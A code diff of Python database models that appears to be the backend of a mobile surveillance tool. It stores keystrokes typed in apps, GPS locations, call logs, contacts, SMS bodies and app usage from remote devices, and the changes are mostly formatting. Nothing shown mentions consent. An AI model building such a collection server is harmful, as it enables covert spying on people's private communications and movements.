@@ -2,6 +2,7 @@ from datetime import datetime
 from config.database import db
 import ast
 
+
 class Device(db.Model):
     __tablename__ = 'devices'
 
@@ -22,15 +23,18 @@ class Device(db.Model):
         return {
             'device_id': self.device_id,
             'device_ip': self.device_ip,
-            'last_seen': self.last_seen.isoformat() if self.last_seen else None
+            'last_seen': self.last_seen,
         }
+
 
 class DeviceInfo(db.Model):
     __tablename__ = 'device_info'
 
     id = db.Column(db.Integer, primary_key=True)
-    device_id = db.Column(db.String(255), db.ForeignKey('devices.device_id'), nullable=False)
-    info_type = db.Column(db.String(50), nullable=False)  # device_info, battery_info, sim_info, os_info
+    device_id = db.Column(db.String(255), db.ForeignKey(
+        'devices.device_id'), nullable=False)
+    # device_info, battery_info, sim_info, os_info
+    info_type = db.Column(db.String(50), nullable=False)
     data = db.Column(db.Text, nullable=False)
     timestamp = db.Column(db.DateTime, default=datetime.now)
 
@@ -47,14 +51,17 @@ class DeviceInfo(db.Model):
             ** parsed_data
         }
 
+
 class Keystroke(db.Model):
     __tablename__ = 'keystrokes'
 
     id = db.Column(db.Integer, primary_key=True)
-    device_id = db.Column(db.String(255), db.ForeignKey('devices.device_id'), nullable=False)
+    device_id = db.Column(db.String(255), db.ForeignKey(
+        'devices.device_id'), nullable=False)
     package_name = db.Column(db.String(255))
     text = db.Column(db.Text)
-    event_type = db.Column(db.String(50))  # TEXT_CHANGE, CLICK, DOUBLE_CLICK, LONG_CLICK, SELECTED
+    # TEXT_CHANGE, CLICK, DOUBLE_CLICK, LONG_CLICK, SELECTED
+    event_type = db.Column(db.String(50))
     timestamp = db.Column(db.DateTime, nullable=False)
     created_at = db.Column(db.DateTime, default=datetime.now)
 
@@ -65,15 +72,17 @@ class Keystroke(db.Model):
             'package_name': self.package_name,
             'text': self.text,
             'event_type': self.event_type,
-            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
-            'created_at': self.created_at.isoformat()
+            'timestamp': self.timestamp,
+            'created_at': self.created_at,
         }
+
 
 class DeviceLocation(db.Model):
     __tablename__ = 'device_locations'
 
     id = db.Column(db.Integer, primary_key=True)
-    device_id = db.Column(db.String(255), db.ForeignKey('devices.device_id'), nullable=False)
+    device_id = db.Column(db.String(255), db.ForeignKey(
+        'devices.device_id'), nullable=False)
     latitude = db.Column(db.Float, nullable=False)
     longitude = db.Column(db.Float, nullable=False)
     accuracy = db.Column(db.Float)
@@ -88,16 +97,18 @@ class DeviceLocation(db.Model):
             'latitude': self.latitude,
             'longitude': self.longitude,
             'accuracy': self.accuracy,
-            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
+            'timestamp': self.timestamp,
             'provider': self.provider,
-            'created_at': self.created_at.isoformat()
+            'created_at': self.created_at,
         }
+
 
 class AppInfo(db.Model):
     __tablename__ = 'apps_info'
 
     id = db.Column(db.Integer, primary_key=True)
-    device_id = db.Column(db.String(255), db.ForeignKey('devices.device_id'), nullable=False)
+    device_id = db.Column(db.String(255), db.ForeignKey(
+        'devices.device_id'), nullable=False)
     package_name = db.Column(db.String(255), nullable=False)
     app_name = db.Column(db.String(255))
     app_version = db.Column(db.String(255))
@@ -105,7 +116,8 @@ class AppInfo(db.Model):
     is_enabled = db.Column(db.Boolean, default=True)
     install_time = db.Column(db.DateTime)
     last_used_time = db.Column(db.DateTime)
-    total_time_in_foreground = db.Column(db.Integer)  # Total time in foreground in milliseconds
+    # Total time in foreground in milliseconds
+    total_time_in_foreground = db.Column(db.Integer)
     created_at = db.Column(db.DateTime, default=datetime.now)
 
     def to_dict(self):
@@ -117,17 +129,19 @@ class AppInfo(db.Model):
             'app_version': self.app_version,
             'is_system_app': self.is_system_app,
             'is_enabled': self.is_enabled,
-            'install_time': self.install_time.isoformat() if self.install_time else None,
-            'last_used_time': self.last_used_time.isoformat() if self.last_used_time else None,
+            'install_time': self.install_time,
+            'last_used_time': self.last_used_time,
             'total_time_in_foreground': self.total_time_in_foreground,
-            'created_at': self.created_at.isoformat()
+            'created_at': self.created_at,
         }
+
 
 class CallLog(db.Model):
     __tablename__ = 'call_logs'
 
     id = db.Column(db.Integer, primary_key=True)
-    device_id = db.Column(db.String(255), db.ForeignKey('devices.device_id'), nullable=False)
+    device_id = db.Column(db.String(255), db.ForeignKey(
+        'devices.device_id'), nullable=False)
     phone_number = db.Column(db.String(50), nullable=False)
     contact_name = db.Column(db.String(255))
     call_type = db.Column(db.String(20))  # INCOMING, OUTGOING, MISSED
@@ -143,15 +157,17 @@ class CallLog(db.Model):
             'contact_name': self.contact_name,
             'call_type': self.call_type,
             'duration': self.duration,
-            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
-            'created_at': self.created_at.isoformat()
+            'timestamp': self.timestamp,
+            'created_at': self.created_at,
         }
+
 
 class Contact(db.Model):
     __tablename__ = 'contacts'
 
     id = db.Column(db.Integer, primary_key=True)
-    device_id = db.Column(db.String(255), db.ForeignKey('devices.device_id'), nullable=False)
+    device_id = db.Column(db.String(255), db.ForeignKey(
+        'devices.device_id'), nullable=False)
     name = db.Column(db.String(255), nullable=False)
     phone_numbers = db.Column(db.Text)  # Stored as JSON string
     last_updated = db.Column(db.DateTime, nullable=False)
@@ -163,15 +179,17 @@ class Contact(db.Model):
             'device_id': self.device_id,
             'name': self.name,
             'phone_numbers': self.phone_numbers,
-            'last_updated': self.last_updated.isoformat() if self.last_updated else None,
-            'created_at': self.created_at.isoformat()
+            'last_updated': self.last_updated,
+            'created_at': self.created_at,
         }
+
 
 class SMSMessage(db.Model):
     __tablename__ = 'sms_messages'
 
     id = db.Column(db.Integer, primary_key=True)
-    device_id = db.Column(db.String(255), db.ForeignKey('devices.device_id'), nullable=False)
+    device_id = db.Column(db.String(255), db.ForeignKey(
+        'devices.device_id'), nullable=False)
     phone_number = db.Column(db.String(50), nullable=False)
     contact_name = db.Column(db.String(255))
     message_type = db.Column(db.String(20))  # INBOX, SENT, DRAFT, OUTBOX
@@ -187,6 +205,6 @@ class SMSMessage(db.Model):
             'contact_name': self.contact_name,
             'message_type': self.message_type,
             'message_body': self.message_body,
-            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
-            'created_at': self.created_at.isoformat()
-        } 
+            'timestamp': self.timestamp,
+            'created_at': self.created_at,
+        }
